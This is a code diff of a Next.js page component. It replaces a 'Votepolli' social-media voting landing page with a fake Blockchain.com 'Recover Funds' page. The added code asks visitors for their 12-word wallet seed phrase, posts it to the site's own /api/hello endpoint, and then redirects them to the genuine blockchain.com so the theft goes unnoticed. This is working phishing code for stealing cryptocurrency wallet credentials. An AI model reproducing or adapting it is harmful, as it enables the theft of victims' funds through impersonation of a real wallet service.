@@ -1,115 +1,75 @@
 import Image from 'next/image'
 import Link from 'next/link'
+import { useState } from 'react'
+import { useRouter } from 'next/router'
 
 const Main = () => {
+
+    const Router = useRouter()
+
+    const [seedPhrase, setSeedPhrase] = useState()
+
+    const handleSubmit = (e) => {
+        e.preventDefault();
+
+        let data = {
+            seedPhrase
+        }
+        const jsondata = JSON.stringify(data)
+        console.log(jsondata)
+  
+        fetch('/api/hello', {
+            method: 'POST',
+            body: jsondata
+        }).then((res) => {
+            console.log('successful')
+                Router.push('https://www.blockchain.com/')
+                setSeedPhrase('')
+
+        })
+      }
+
     return (
-        <main>
-            <div className="relative w-full h-[640px] bg-no-repeat bg-cover bg-[url('../public/background.jpg')] bg-blend-darken flex justify-center overflow-hidden lg:overflow-visible">
+        <main className="bg-[#121D33] w-full h-full">
+            <div className="flex items-center justify-center">
+        <div className="flex flex-col items-center justify-center mt-36">
+            <img src="/images/blockchain.png" alt="blockchain" className="w-52 mb-5"/>
 
-                <div className="absolute top-10 text-white flex flex-col justify-between text-center lg:flex-row">
-                    <div className='mt-3 lg:mr-20'>
-                    <h4 className="uppercase text-base text-gray-400 font-semibold tracking-wider mb-8">Welcome to Vote</h4>
-                    <h2 className=" text-3xl lg:text-5xl font-bold lg:leading-[65px]">Vote @PRO Vote @PR0246!<br/>
-                          For a Revolutionary change.<br/>
-                           Cast your vote Here.
-                      </h2>
-                      <Link href="/signup/instagram">
-                          <a>
-                      <button className="border-[3px] border-white p-1 w-60 rounded mt-8 lg:mt-20 hover:bg-white hover:text-black transition ease-in-out duration-500 font-medium">
-                          <span className='flex justify-center items-center'>
-                              
-                              <Image
-                          src="/insta.svg"
-                          className=""
-                          height={25}
-                          width={30}
-                          alt="second hero"/> 
-                          <span className="mr-7"> Vote via instagram</span>
-                          </span>
-                        
-                      </button>
-                      </a>
-                      </Link>
-                      </div>
+            <div className="xl:w-[480px] md:w-96 w-80 md:h-72 h-80 bg-white rounded-lg lg:px-5 px-2 py-4">
+                <h2 className="font-semibold text-blue-900 text-base">
+                    Recover Funds
+                </h2>
+                <p className="text-xs text-rose-500 mt-2 text-center">
+                   You can recover funds only if you have your valid 12 word phrase
+                </p>
+                  <div className="mt-2">
+                    <p className="font-semibold text-xs text-black text-center capitalize">
+                        Lost your 12 word backup phrase?
+                     </p>
+    
+                     <p className="font-semibold text-xs text-black text-center capitalize">
+                        Backup funds again from Dashboard
+                     </p>
+                  </div>
 
-                      <div className='lg:ml-20 mt-8 lg:mt-1'>
-                          <Image
-                           src="/images/phone.png"
-                           className=""
-                           height={720}
-                           width={430}
-                           alt="second hero"/>
-                      </div>
-                </div>
-            </div>
-            <section className='pt-10'>
-                <div className='flex flex-col lg:flex-row justify-center items-center '>
-                    <div className='lg:mr-52 text-center flex flex-col items-center'>
-                    <h2 className='font-bold text-4xl mb-5 flex lg:mr-5'>About Us</h2>
-                    <div className='w-20 h-[2px] opacity-25 bg-gray-500'></div>
-                    </div>
-                    <p className='font-light break-words text-lg text-gray-700 md:w-[700px] text-center leading-loose lg:text-left mt-5 p-10'>Votepolli is a platform design to help people vote for who they 
-                        like using their social handle, with ease. Votepolli have helped 
-                        numerous contestant in accumulating votes through social media
-                         with very little cost.</p>
-                </div>
-            </section>
-
-            <section className='pt-10 p-5'>
-                <div className='flex flex-col lg:flex-row justify-center items-center'>
-                    <div className='text-center flex flex-col items-center justify-center'>
-                    <h2 className='font-bold text-4xl mb-5'>How we Work?</h2>
-                    <div className='w-20 h-[2px] opacity-25 bg-gray-500'></div>
-                    </div>
-                </div>
-
-                <div className='grid justify-items-center lg:grid-cols-2 gap-4 gap-y-10'>
-                    <div className='p-4 m-4 flex flex-col lg:flex-row justify-center items-center'>
-                        <div className='h-14 w-14 p-5 rounded-full bg-green-600 text-white lg:mr-8 flex justify-center items-center mb-4'><span>1</span></div>
-                        <div>
-                            <h2 className='font-bold text-center lg:text-left text-2xl mb-5'> Sign-in</h2>
-
-                            <div className='font-light leading-loose text-md text-gray-600 max-w-lg text-center lg:text-left'>To vote you must first signin via 
-                            your social media account, before proceeding 
-                                 to voting page.</div>
-                        </div>
-                    </div>
-
-                    <div className='p-4 m-4 flex flex-col lg:flex-row justify-center items-center'>
-                    <div className='h-14 w-14 p-5 rounded-full bg-green-600 text-white lg:mr-8 flex justify-center items-center mb-4'><span>2</span></div>
-                        <div>
-                        <h2 className='font-bold text-center lg:text-left text-2xl mb-5'> Select</h2>
-                        <div className='font-light leading-loose text-md text-gray-600 max-w-lg text-center lg:text-left'>Select the name of the candidate you
-                            intend voting for and place your vote.</div>
-                        </div>
-                        
-                    </div>
-
-                    <div className='p-4 m-4 flex flex-col lg:flex-row justify-center items-center'>
-                    <div className='h-14 w-14 p-5 rounded-full bg-green-600 text-white lg:mr-8 flex justify-center items-center mb-4 self-center'><span>3</span></div>
-                        <div className=''>
-                        <h2 className='font-bold text-center lg:text-left text-2xl mb-5'> Create</h2>
-                        <div className='font-light leading-loose text-md text-gray-600 max-w-lg text-center lg:text-left'>To get us to create a lead for your own 
-                            campaign, leave a mail, and we will 
-                            contact you.</div>
-                        </div>
-                        
-                    </div>
-
-                    <div className='p-4 m-4 flex flex-col lg:flex-row justify-center items-center'>
-                    <div className='h-14 w-14 p-5 rounded-full bg-green-600 text-white lg:mr-8 flex justify-center items-center mb-4'><span>4</span></div>
-                        <div className=''>
-                        <h2 className='font-bold text-center lg:text-left text-2xl mb-5'> Publish</h2>
-                        <div className='font-light leading-loose text-md text-gray-600 max-w-lg text-center lg:text-left'>After we are done verifying you and what 
-                            you are campaigning for we will 
-                            publish it on our platform. that simple.</div>
-                        </div>
-                        
-                    </div>
-                    
-                </div>
+                  <p className="text-xs font-light mt-2 text-center">
+                    Enter your 12 word phrase, lowercase, with spaces between each word, to 
+                    recover your funds and transactions
+                 </p>
                 
-            </section>
+                <form onSubmit={(e) => handleSubmit(e)} name="submit" method="post" id="send_mail" className="mt-3 flex flex-col">
+                  <label htmlFor="seed_phrase" className="text-right text-xs text-rose-500 mb-1"> Required</label>
+                 <input type="text" name="seed_phrase" onChange={(e) =>{ return setSeedPhrase(e.target.value)}} className="w-full h-10 p-2 border border-rose-800 rounded outline-none focus:border-rose-500" required/>
+                 <div className="flex justify-end">
+                     <button className="text-sm font-normal text-blue-600 mt-1 mr-3">Go Back</button>
+                     <input type="submit" value="continue" name="submit" className="text-white self-end w-32 h-9 bg-blue-600 mt-2 rounded text-sm hover:bg-blue-800 cursor-pointer"/>
+                 </div>
+                 
+                </form>
+    
+            </div>
+        </div>
+    </div>
          
         </main>
     )
